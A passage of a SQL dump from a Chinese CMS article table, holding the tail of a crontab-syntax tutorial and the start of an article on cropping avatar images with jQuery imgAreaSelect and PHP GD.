:p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;0 10 6 *1-5 lynx http://www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;每个月的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;6&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;号和每个礼拜的星期一到星期五的早上&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;10&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;点访问&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;0 5 7 8 *lynx http://www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;8&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;月&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;7&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;日早上&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;点访问&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;上面几个特殊的意思：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&quot;*&quot;&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;代表所有的取值范围内的数字，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;代表每的意思&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;,&quot;*/5&quot;&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;表示每&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;个单位，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;代表从某个数字到某个数字&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;,&quot;,&quot;&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;分开几个离散的数字。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;o :p&gt;&amp;nbsp;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302789094, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(58, 1, 'PHP与jQuery结合实现截图功能 实现用户自定义头像-web技术', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:arial, helvetica, sans-serif, simsun, ����;font-size:13px;line-height:normal;&quot;&gt;文中通过jQuery插件imgAreaSelect动态截取图像，可以获取当前小图像在源图片中的位置等信息，jQuery的imgAreaSelect插件内置方法preview()可得到当前图像的坐标(起点XY和终点XY)以及宽度和高度，再结合PHP GD库内置函数imagecopyresampled()的复制图像功能，在图片中截取图像，实现具体应用如：用户自定义头像功能等。&lt;br /&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;一，javascript代码部分&lt;/strong&gt;&lt;/p&gt;\r\n&lt;ol style=&quot;margin-top:20px;margin-right:5px;margin-bottom:20px;margin-left:5px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;list-style-type:none;list-style-position:initial;list-style-image:initial;border-left-color:#ece9d8;border-left-width:10px;border-left-style:solid;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;border-right-color:#f3f3f3;border-right-width:1px;border-right-style:solid;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;function preview(img,&amp;nbsp;&lt;strong&gt;selection&lt;/strong&gt;) {&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var scaleX = 100 / selection.width;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var scaleY = 100 / selection.height;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''#thumbnail + div &amp;gt; img'').css({&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;width: Math.round(scaleX * 400) + ''px'',&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;height: Math.round(scaleY * 300) + ''px'',&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;marginLeft: ''-'' + Math.round(scaleX * selection.x1) + ''px'',&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;marginTop: ''-'' + Math.round(scaleY * selection.y1) + ''px''&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;});&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''&lt;strong&gt;#x1&lt;/strong&gt;'').val(&lt;strong&gt;selection.x1&lt;/strong&gt;);&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''&lt;strong&gt;#y1&lt;/strong&gt;'').val(&lt;strong&gt;selection.y1&lt;/strong&gt;);&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''&lt;strong&gt;#x2&lt;/strong&gt;'').val(&lt;strong&gt;selection.x2&lt;/strong&gt;);&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''&lt;strong&gt;#y2&lt;/strong&gt;'').val(&lt;strong&gt;selection.y2&lt;/strong&gt;);&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''&lt;strong&gt;#w&lt;/strong&gt;'').val(&lt;strong&gt;selection.width&lt;/strong&gt;);&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''&lt;strong&gt;#h&lt;/strong&gt;'').val(&lt;strong&gt;selection.height&lt;/strong&gt;);&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;}&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(document).ready(function () {&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;$(''&lt;strong&gt;#save_thumb&lt;/strong&gt;'').click(function() {&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var&amp;nbsp;&lt;strong&gt;x1&amp;nbsp;&lt;/strong&gt;= $(''#x1'').val();&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var&amp;nbsp;&lt;strong&gt;y1&amp;nbsp;&lt;/strong&gt;= $(''#y1'').val();&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var&amp;nbsp;&lt;strong&gt;x2&amp;nbsp;&lt;/strong&gt;= $(''#x2'').val();&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var&amp;nbsp;&lt;strong&gt;y2&amp;nbsp;&lt;/strong&gt;= $(''#y2'').val();&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var&amp;nbsp;&lt;strong&gt;w&amp;nbsp;&lt;/strong&gt;= $(''#w'').val();&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;var&amp;nbsp;&lt;strong&gt;h&amp;nbsp;&lt;/strong&gt;= $(''#h'').val();&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;if(x1==&quot;&quot; || y1==&quot;&quot; || x2==&quot;&quot; || y2==&quot;&quot; || w==&quot;&quot; || h==&quot;&quot;){&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;alert(&quot;请选择缩略图&quot;);&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;return false;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;}else{&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;return true;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;}&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;});&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;});&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;二，增加form表单Html&lt;/strong&gt;&lt;/p&gt;\r\n&lt;ol style=&quot;margin-top:20px;margin-right:5px;margin-bottom:20px;margin-left:5px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;list-style-type:none;list-style-position:initial;list-style-image:initial;border-left-color:#ece9d8;border-left-width:10px;border-left-style:solid;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;border-right-color:#f3f3f3;border-right-width:1px;border-right-style:solid;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;form name=&quot;thumbnail&quot; action=&quot;&quot; method=&quot;post&quot;&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;input type=&quot;&lt;strong&gt;hidden&lt;/strong&gt;&quot; name=&quot;&lt;strong&gt;x1&lt;/strong&gt;&quot; value=&quot;&quot; id=&quot;x1&quot; /&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;input type=&quot;&lt;strong&gt;hidden&lt;/strong&gt;&quot; name=&quot;&lt;strong&gt;y1&lt;/strong&gt;&quot; value=&quot;&quot; id=&quot;y1&quot; /&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;input type=&quot;&lt;strong&gt;hidden&lt;/strong&gt;&quot; name=&quot;&lt;strong&gt;x2&lt;/strong&gt;&quot; value=&quot;&quot; id=&quot;x2&quot; /&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;input type=&quot;&lt;strong&gt;hidden&lt;/strong&gt;&quot; name=&quot;&lt;strong&gt;y2&lt;/strong&gt;&quot; value=&quot;&quot; id=&quot;y2&quot; /&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;input type=&quot;&lt;strong&gt;hidden&lt;/strong&gt;&quot; name=&quot;&lt;strong&gt;w&lt;/strong&gt;&quot; value=&quot;&quot; id=&quot;w&quot; /&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;input type=&quot;&lt;strong&gt;hidden&lt;/strong&gt;&quot; name=&quot;&lt;strong&gt;h&lt;/strong&gt;&quot; value=&quot;&quot; id=&quot;h&quot; /&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;input type=&quot;submit&quot; name=&quot;upload_thumbnail&quot; value=&quot;保存缩略图&quot; id=&quot;&lt;strong&gt;save_thumb&lt;/strong&gt;&quot; /&amp;gt;&lt;/li&gt;\r\n&lt;li style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:15px;font:normal normal normal 90%/130% ''courier new'', courier;color:#222222;overflow-x:auto;overflow-y:auto;width:680px;&quot;&gt;&amp;lt;/form&amp;gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;当点击保存缩略图按钮后，form表单中隐藏框如x1，y1等值由jQuery的imgAreaSelect调取preview()方法获取当前截取图像的位置如：selection.x1，selection.y1，同时判断值是否存在，如果其中任何一个值不存在则不提交，并友好提示。接下来就把当前图像的坐标位置交给PHP GD库内置imagecopyresampled()函数处理。&lt;br /&gt;\r\n&lt;p 